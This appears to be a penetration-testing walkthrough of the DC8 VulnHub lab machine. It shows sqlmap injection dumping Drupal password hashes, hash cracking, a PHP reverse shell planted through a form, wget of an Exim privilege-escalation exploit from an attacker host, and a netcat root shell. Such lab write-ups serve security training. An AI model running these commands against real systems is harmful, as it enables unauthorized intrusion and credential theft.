@@ -1,0 +1,137 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">DC8: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/dc8-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-09-21T04:50:53+00:00">September 21, 2019</time><time class="updated" datetime="2025-06-10T20:11:06+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">DC8 VM is made by <a style="color: #000000;" href="https://twitter.com/dcau7">DCAU</a>. This VM is a purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. It is of intermediate level and is very handy in order to brush up your skills as a penetration tester. The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read a flag.</span></p>
+<p><span style="color: #000000;"><strong>Level:</strong> Intermediate</span></p>
+<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this <a style="color: #000000;" href="https://www.vulnhub.com/entry/dc-8,367/#download"><strong>link</strong></a>.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">netdiscover</span></li>
+<li><span style="color: #000000;">nmap port scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">SQL Injection for finding Credentials</span></li>
+<li><span style="color: #000000;">Performing Directory Bruteforce</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploiting</strong></span>
+<ul>
+<li><span style="color: #000000;">Editing HTML form</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Exim Local Escalation</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Capture the flag</strong></span></li>
+</ul>
+<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">The first step to attack is to identify the target. So, identify your target. To identify the target, we will use the following command:</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-54tGg6Mm_n8/XYWm0JPT87I/AAAAAAAAgmk/TYvKJe4mSyYSlWIGjKfO7bpQ6vZHVaoIwCLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">Now we will run an aggressive port scan using nmap to gain the information about the open ports and the services running on the target machine.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.0.6</pre>
+<p><span style="color: #000000;">We learned from the scan that we have the port 80 open which is hosting Apache httpd service with Drupal 7, and we have the port 22 open. This tells us that we also have the OpenSSH service running on the target machine.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-DWWBbcAQl3I/XYWm3NuvjAI/AAAAAAAAgnI/BuUSdx7QXN8fB2Vza-wU6kWqm_O5CRkcACLcBGAsYHQ/s1600/2.png"/></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Further, we need to start enumeration against the host machine, therefore we navigated to a web browser for exploring HTTP service, and DC:8- Welcome page will be opened in the browser. We enumerated the links provided on left. They seemed a bit fishy.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-qSyUYr_WG10/XYWm3vYEVYI/AAAAAAAAgnQ/xxOQLGCPmYoTbA9S06FPYgnuLIAM7rgIwCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">We enumerated these links to find SQL related Errors. So we used the single quote(‘) to get an error message. We will enumerate this error further.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-UWkTWHohlsM/XYWm3-4yY6I/AAAAAAAAgnU/pVe-fAQpRcgxenJcoeHAwFwwMhVzcKLawCLcBGAsYHQ/s1600/4.png"/></p>
+<p><span style="color: #000000;">After some enumeration and poking around, we realised it is definitely SQL Error. We decided to run the sqlmap against the target machine. Here, we set the risk at 3 and level at 5. This is the option we got the best results in the least time.</span></p>
+<pre class="lang:default decode:true">sqlmap -u 192.168.0.6/?nid=2 --dbs --batch --risk 3 --level 5</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-pwqsDdgoYig/XYWm4n0osNI/AAAAAAAAgnY/3qwq8qbDlOwKSmzZSvsu58DMpsTbR_tFACLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">After working for some time our sqlmap gave us some important information. It showed us that there are 2 available databases in the target machine which are:</span></p>
+<ol>
+<li><span style="color: #000000;">d7db</span></li>
+<li><span style="color: #000000;">information_schema</span></li>
+</ol>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-xgvv2SecVnY/XYWm5NVbuuI/AAAAAAAAgng/7d4vm0Rf02IlCe4q7dM394ZaBMD1MQmnQCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">Now that we got the database named ‘d7db’, it’s time to further enumerate this database. We re-constructed our sqlmap script with parameters like [–tables] [–batch]. This helps us to enumerate the tables inside the database. </span></p>
+<pre class="lang:default decode:true">sqlmap -u 192.168.0.6/?nid=2 -D d7db --tables --batch --risk 3 --level 5</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-f6oAvGCDgCg/XYWm49RcFLI/AAAAAAAAgnc/QAvFViLY-T4hJnozSZEYfVb_bsC9HQ3ZwCLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">This gave us a very large number of tables. We went through it with a keen eye. We found a table named ‘users’. This is definitely worth looking into.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-CUN_owj2fUI/XYWm5cLzcMI/AAAAAAAAgnk/TzvMyUDGUbwHoXIxWe8ZheLGfS6xI64egCLcBGAsYHQ/s1600/8.png"/></p>
+<p><span style="color: #000000;">Our reliable sqlmap provided us with further more details like we get the following details:</span></p>
+<table>
+<tbody>
+<tr>
+<td width="40"><span style="color: #000000;">uid</span></td>
+<td width="66"><span style="color: #000000;">name</span></td>
+<td width="189"><span style="color: #000000;">init</span></td>
+<td width="456"><span style="color: #000000;">Pass</span></td>
+</tr>
+<tr>
+<td width="40"><span style="color: #000000;">1</span></td>
+<td width="66"><span style="color: #000000;">admin</span></td>
+<td width="189"><span style="color: #000000;">dc8blah@dc8blah.org</span></td>
+<td width="456"><span style="color: #000000;">$D2tRcYRyqVFNSCONVYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span></td>
+</tr>
+<tr>
+<td width="40"><span style="color: #000000;">2</span></td>
+<td width="66"><span style="color: #000000;">john</span></td>
+<td width="189"><span style="color: #000000;">john@blahsdfsfd.org</span></td>
+<td width="456"><span style="color: #000000;">$S$DqupvJbxVmqj r6cYePnx2A8911Ln7lsuku/3if/oRVZJaz5mKC2vF</span></td>
+</tr>
+</tbody>
+</table>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-W8UWg0zUxOg/XYWm5guXBnI/AAAAAAAAgno/k-TDsH8LcGwk2XsnhKXnQBukDis1EixnQCLcBGAsYHQ/s1600/9.png"/></p>
+<p><span style="color: #000000;">So, we got hashes. Whenever we get some hashes all we remember is our best friend John The Ripper. The hashes were saved in a file named ‘hash’. We ran it through john. After working on it for some time. John cracked one of the hashes, it came out to be ‘turtle’.</span></p>
+<pre class="lang:default decode:true">john hash</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-XawS6S5bb6Y/XYWm0D7hkVI/AAAAAAAAgmg/WzDe8XqW3JcFQCNCmQ84BzvDXabcj6Y7QCLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">This seemed as some information that might be useful somewhere else further down the road. For now, let’s try Directory Bruteforce using dirb. This surprisingly gave us a page with the name ‘user’.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.0.6</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-WWkTtk-CnxY/XYWm0BLJWNI/AAAAAAAAgmc/dAmVM3eOXSo3xrArUcWoCB_eUgEMxlCrwCLcBGAsYHQ/s1600/11.png"/></p>
+<p><span style="color: #000000;">On opening the page in our browser, we saw that it requires some login credentials. We found some credentials in our exploitation of SQL Injection. We logged in this panel using the following credentials:</span></p>
+<p><span style="color: #000000;"><strong>Username: john</strong></span></p>
+<p><span style="color: #000000;"><strong>Password: turtle</strong></span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-xbkVXFWIh7U/XYWm1GJGviI/AAAAAAAAgmo/fFIn3hq6X2svsh49Eg2LV0jXoh6LGfOTwCLcBGAsYHQ/s1600/12.png"/></p>
+<p><span style="color: #000000;">After logging in it was time to look around and try different options. While enumerating we stumbled upon Form settings. Let’s take a closer look at it.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-z8PIxaNOU9A/XYWm1aLzhJI/AAAAAAAAgms/QsiXSEp5QCsxGp6Wxe0ihYxqDMahdrAoQCLcBGAsYHQ/s1600/13.png"/></p>
+<h3><span style="color: #800000;"><strong>Exploiting</strong></span></h3>
+<p><span style="color: #000000;">Here we saw that we had an option to change the text format. We changed it to PHP code. This revealed the php code on the webpage. We edited this page with our php reverse shell so as to generate a shell over the target machine.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-qwgYU8YLLjw/XYWm1UBQX4I/AAAAAAAAgmw/-7NKw211S1QXBpUPfNJMPIv_KnXCfGrqgCLcBGAsYHQ/s1600/14.png"/></p>
+<p><span style="color: #000000;">Now that we have edited out php code, we also started a netcat listener to receive a shell that would be generated on the execution of our php reverse shell script.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234</pre>
+<p><span style="color: #000000;">Now to submit the form with our php reverse shell script, we would have to enter some of these mandatory data. This details can be anything but they should support the format of the data supposed to be entered.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-AQ7qmEfbyVk/XYWm2D0dDvI/AAAAAAAAgm4/y0JSmF-AWdES_v_LOhU_baPSe-BNwKM-QCLcBGAsYHQ/s1600/16.png"/></p>
+<p><span style="color: #000000;">After typing in all that information, we clicked on the submit button. After a few seconds, we got the shell from the target machine. It was a shell of user ‘www-data’. This was an improper shell. So, in order to convert it into a proper shell, we ran the python one-liner mentioned below.</span></p>
+<p><span style="color: #000000;">After getting a proper shell, it was a time to escalate privilege on this machine. So, to do that we ran the find command to find the files with the SUID permissions. We found a service named exim4. Now, in order to proceed further, we are going to need the version of the exim4 tool. It will help us in searching for some exploit on the internet. This was found to be 4.89.</span></p>
+<pre class="lang:default decode:true">$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@dc-8:/$ find / -perm -u=s -type f 2&gt;/dev/null
+www-data@dc-8:/$ exim --version | head -1</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-AQ7qmEfbyVk/XYWm2D0dDvI/AAAAAAAAgm4/y0JSmF-AWdES_v_LOhU_baPSe-BNwKM-QCLcBGAsYHQ/s1600/16.png"/></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">We surfed the web for an exploit regarding exim tool of version 4.89. ExploitDB came up with the rescue. It gave us this Local Privilege Escalation Exploit. We examined it carefully.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-UnJGGD67laY/XYWm2Wa9PkI/AAAAAAAAgm8/iGsWLbIEQ2oU-7jnm_Hu3MWXh9umCPalwCLcBGAsYHQ/s1600/17.png"/></p>
+<p><span style="color: #000000;">Firstly, we traversed into the /tmp directory, because we need to transfer a file and /tmp directory has the writable permission. We downloaded it into our attacker machine i.e Kali Linux and renamed it raptor_exim_wiz.sh. We edited our IP address and the port which we will be using to capture the netcat session. After that, we created a server on the Kali Linux to send the file directly to the target machine. We used the wget command for this transfer. After transferring the script on the target machine, we gave it proper permissions so that it can execute properly.</span></p>
+<pre class="lang:default decode:true">www-data@dc-8:/tmp$ wget http://192.168.0.8:8000/raptor_exim_wiz.sh
+www-data@dc-8:/tmp$ chmod 777 raptor_exim_wiz.sh</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-eFdG6FMRcy8/XYWm2XQmP0I/AAAAAAAAgnA/wTuHjpfwo7EtKgejEQzP6aaMKwnlCp9dQCLcBGAsYHQ/s1600/18.png"/></p>
+<p><span style="color: #000000;">After providing with the proper permissions, it’s time to run a listener so that we can capture the shell which would be generated by this script. After that, we ran the command with the option to invoke netcat as shown in the image given below. This script invoked a netcat shell to our attacker machine on port 4444.</span></p>
+<pre class="lang:default decode:true">nc -lvp 4444
+www-data@dc-8:/tmp$ ./raptor_exim_wiz.sh -m netcat</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-i_TmB_n2V_w/XYWm2mUV0vI/AAAAAAAAgnE/jPllqpIkkU04vU24xg8_o2LuYLQ_UgOdACLcBGAsYHQ/s1600/19.png"/></p>
+<h3><span style="color: #800000;"><strong>Capture the flag</strong></span></h3>
+<p><span style="color: #000000;">We successfully got the shell on the target machine. On running the whoami command, we got a satisfactory response of ‘root’. We traversed into the root directory using the cd command. We found our flag at this location.</span></p>
+<pre class="lang:default decode:true">whoami
+cd /root
+ls
+cat flag.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-8DxbN5WQFUA/XYWm3izUFOI/AAAAAAAAgnM/HLVeidd7ox8thcdXKhJYesgJPhHYWILewCLcBGAsYHQ/s1600/20.png"/></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact</span> <a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132"><strong>here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
